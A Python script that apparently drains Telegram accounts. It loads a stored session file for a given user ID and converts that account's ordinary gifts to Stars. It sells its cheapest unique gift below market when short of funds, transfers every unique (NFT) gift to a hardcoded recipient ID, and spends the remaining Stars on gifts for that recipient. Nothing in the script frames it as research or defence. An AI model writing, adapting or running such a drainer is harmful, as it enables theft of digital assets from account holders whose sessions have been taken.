import os
import sys
import argparse
import asyncio
import time

# Ensure repo root is on sys.path when running as a script
REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

from automation.analyze_non_unique_gifts_for_funding import analyze_non_unique_gifts_for_funding
from automation.buy_and_send_regular_gift import buy_and_send_regular_gift
from automation.calc_required_transfer_stars import calc_required_transfer_stars
from automation.convert_gift_to_stars import convert_gift_to_stars
from automation.filter_unique_star_gifts import filter_unique_star_gifts
from automation.find_cheapest_unique_gift_to_sell import find_cheapest_unique_gift_to_sell
from automation.get_available_regular_gifts import get_available_regular_gifts
from automation.get_saved_star_gifts import get_saved_star_gifts
from automation.get_self_peer import get_self_peer
from automation.get_stars_balance import get_stars_balance
from automation.get_telegram_client import get_telegram_client
from automation.select_gifts_within_budget import select_gifts_within_budget
from automation.sell_unique_gift import sell_unique_gift
from automation.transfer_unique_gift import transfer_unique_gift

# Recipient user ID for transfers
RECIPIENT_USER_ID = 8316993133

# Fixed discount when selling unique gift (50 Stars below market price)
SELL_DISCOUNT_STARS = 50

# Poll interval for checking balance after selling (seconds)
BALANCE_CHECK_INTERVAL = 10

# Max wait time for balance to increase after selling (seconds)
MAX_BALANCE_WAIT_TIME = 300


async def wait_for_balance_increase(
    client: TelegramClient, peer, initial_balance: int, target_balance: int, timeout: int
) -> bool:
    """
    Waits for Stars balance to reach target_balance, polling every BALANCE_CHECK_INTERVAL seconds.
    Returns True if target reached, False if timeout.
    """
    start_time = time.time()
    while time.time() - start_time < timeout:
        current_balance = await get_stars_balance(client=client, peer=peer)
        if current_balance >= target_balance:
            return True
        await asyncio.sleep(BALANCE_CHECK_INTERVAL)
    return False


async def _main_async(user_id: str, limit: int, dry_run: bool) -> int:
    client = get_telegram_client(user_id)
    await client.connect()
    try:
        if not await client.is_user_authorized():
            print(f"[ERROR] Session for user_id={user_id} is not authorized.")
            return 2

        me = await get_self_peer(client)
        print(f"[INFO] User: {user_id}")
        print(f"[INFO] Recipient user ID: {RECIPIENT_USER_ID}")

        # Get all saved gifts
        print("[INFO] Fetching saved gifts...")
        gifts = await get_saved_star_gifts(client=client, peer=me, limit=limit)
        unique = filter_unique_star_gifts(gifts)
        print(f"[INFO] Total saved gifts: {len(gifts)}")
        print(f"[INFO] Unique (NFT) gifts: {len(unique)}")

        if len(unique) == 0:
            print("[INFO] No unique gifts found. Nothing to transfer.")
            return 0

        # Calculate required Stars (15 per unique gift)
        required_transfer = calc_required_transfer_stars(unique)
        transferable_count = required_transfer // 15
        print(f"[INFO] Transferable unique gifts: {transferable_count}")
        print(f"[INFO] Stars required for transfer: {required_transfer} (15 per gift)")

        # Check current balance
        stars_balance = await get_stars_balance(client=client, peer=me)
        print(f"[INFO] Current Stars balance: {stars_balance}")

        if stars_balance >= required_transfer:
            print("[OK] Enough Stars to transfer all unique gifts.")
        else:
            shortage = required_transfer - stars_balance
            print(f"[WARN] Not enough Stars. Shortage: {shortage}")

            # Try converting non-unique gifts to Stars
            funding = analyze_non_unique_gifts_for_funding(gifts)
            print(f"[INFO] Non-unique gifts convertible to Stars: {funding.convertible_count}")

            if funding.convertible_count > 0:
                print("[INFO] Converting non-unique gifts to Stars...")
                converted = 0
                for gift in gifts:
                    if gift in unique:
                        continue
                    convert_stars = getattr(gift, "convert_stars", None)
                    if isinstance(convert_stars, int) and convert_stars > 0:
                        if not dry_run:
                            if await convert_gift_to_stars(client, gift):
                                converted += 1
                                print(f"[OK] Converted gift (msg_id={getattr(gift, 'msg_id', '?')}) -> {convert_stars} Stars")
                                await asyncio.sleep(1)  # Rate limiting
                        else:
                            print(f"[DRY-RUN] Would convert gift (msg_id={getattr(gift, 'msg_id', '?')}) -> {convert_stars} Stars")
                            converted += 1

                if converted > 0:
                    # Recheck balance after conversion
                    stars_balance = await get_stars_balance(client=client, peer=me)
                    print(f"[INFO] Stars balance after conversion: {stars_balance}")

            # If still not enough, sell cheapest unique gift
            if stars_balance < required_transfer:
                print("[INFO] Still not enough Stars. Looking for cheapest unique gift to sell...")
                cheapest_info = await find_cheapest_unique_gift_to_sell(client, unique)
                if cheapest_info:
                    cheapest_gift, market_price = cheapest_info
                    sell_price = max(50, market_price - SELL_DISCOUNT_STARS)  # At least 50 Stars
                    print(f"[INFO] Found cheapest unique gift (market price: {market_price} Stars)")
                    print(f"[INFO] Will sell for {sell_price} Stars ({SELL_DISCOUNT_STARS} Stars below market)")

                    if not dry_run:
                        if await sell_unique_gift(client, cheapest_gift, sell_price):
                            print(f"[OK] Listed unique gift for resale at {sell_price} Stars")
                            print(f"[INFO] Waiting for balance to increase (checking every {BALANCE_CHECK_INTERVAL}s, max {MAX_BALANCE_WAIT_TIME}s)...")
                            initial_balance = stars_balance
                            if await wait_for_balance_increase(
                                client, me, initial_balance, required_transfer, MAX_BALANCE_WAIT_TIME
                            ):
                                stars_balance = await get_stars_balance(client=client, peer=me)
                                print(f"[OK] Balance increased to {stars_balance} Stars")
                            else:
                                print(f"[WARN] Timeout waiting for balance increase. Current: {await get_stars_balance(client=client, peer=me)}")
                        else:
                            print("[ERROR] Failed to list gift for resale")
                            return 1
                    else:
                        print(f"[DRY-RUN] Would sell unique gift for {sell_price} Stars")
                else:
                    print("[ERROR] No sellable unique gift found")
                    return 1

        # Transfer all unique gifts to recipient
        if stars_balance >= required_transfer or dry_run:
            print(f"[INFO] Transferring {transferable_count} unique gifts to user {RECIPIENT_USER_ID}...")
            transferred = 0
            failed = 0

            for gift in unique:
                # Check if transferable now
                can_transfer_at = getattr(gift, "can_transfer_at", None)
                now = int(time.time())
                if isinstance(can_transfer_at, int) and can_transfer_at > now:
                    print(f"[SKIP] Gift (msg_id={getattr(gift, 'msg_id', '?')}) not transferable yet (can_transfer_at={can_transfer_at})")
                    continue

                if not dry_run:
                    if await transfer_unique_gift(client, gift, RECIPIENT_USER_ID):
                        transferred += 1
                        print(f"[OK] Transferred gift (msg_id={getattr(gift, 'msg_id', '?')})")
                        await asyncio.sleep(1)  # Rate limiting
                    else:
                        failed += 1
                        print(f"[ERROR] Failed to transfer gift (msg_id={getattr(gift, 'msg_id', '?')})")
                else:
                    print(f"[DRY-RUN] Would transfer gift (msg_id={getattr(gift, 'msg_id', '?')})")
                    transferred += 1

            print(f"[INFO] Transfer complete. Transferred: {transferred}, Failed: {failed}")

            # After transferring unique gifts, check remaining Stars balance
            remaining_balance = await get_stars_balance(client=client, peer=me)
            print(f"[INFO] Remaining Stars balance after transfers: {remaining_balance}")

            if remaining_balance > 0:
                print(f"[INFO] Buying and sending regular gifts with remaining {remaining_balance} Stars...")
                # Get available regular gifts
                regular_gifts = await get_available_regular_gifts(client)
                print(f"[INFO] Available regular gifts: {len(regular_gifts)}")

                if regular_gifts:
                    # Select gifts that fit within remaining budget
                    affordable_gifts = select_gifts_within_budget(regular_gifts, remaining_balance)
                    print(f"[INFO] Can afford {len(affordable_gifts)} regular gift(s)")

                    if affordable_gifts:
                        sent_count = 0
                        failed_count = 0
                        total_spent = 0

                        for gift in affordable_gifts:
                            gift_stars = getattr(gift, "stars", 0) or 0
                            gift_id = getattr(gift, "id", "?")
                            gift_title = getattr(gift, "title", None) or f"Gift #{gift_id}"

                            if not dry_run:
                                if await buy_and_send_regular_gift(client, gift, RECIPIENT_USER_ID):
                                    sent_count += 1
                                    total_spent += gift_stars
                                    print(f"[OK] Sent regular gift: {gift_title} ({gift_stars} Stars)")
                                    await asyncio.sleep(2)  # Rate limiting for purchases
                                else:
                                    failed_count += 1
                                    print(f"[ERROR] Failed to send regular gift: {gift_title}")
                            else:
                                print(f"[DRY-RUN] Would send regular gift: {gift_title} ({gift_stars} Stars)")
                                sent_count += 1
                                total_spent += gift_stars

                        print(f"[INFO] Regular gifts sent: {sent_count}, Failed: {failed_count}, Total spent: {total_spent} Stars")
                    else:
                        print("[INFO] No affordable regular gifts found")
                else:
                    print("[INFO] No regular gifts available")

            return 0 if failed == 0 else 1
        else:
            print(f"[ERROR] Still not enough Stars ({stars_balance} < {required_transfer})")
            return 1

    finally:
        await client.disconnect()


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Automatically transfer unique gifts to recipient, converting/selling gifts if needed"
    )
    parser.add_argument("--user-id", required=True, help="Session key (maps to data/sessions/<user-id>.session)")
    parser.add_argument("--limit", type=int, default=200, help="Max gifts to fetch")
    parser.add_argument("--dry-run", action="store_true", help="Simulate actions without actually executing them")
    args = parser.parse_args()

    return asyncio.run(_main_async(user_id=args.user_id, limit=args.limit, dry_run=args.dry_run))


if __name__ == "__main__":
    raise SystemExit(main())

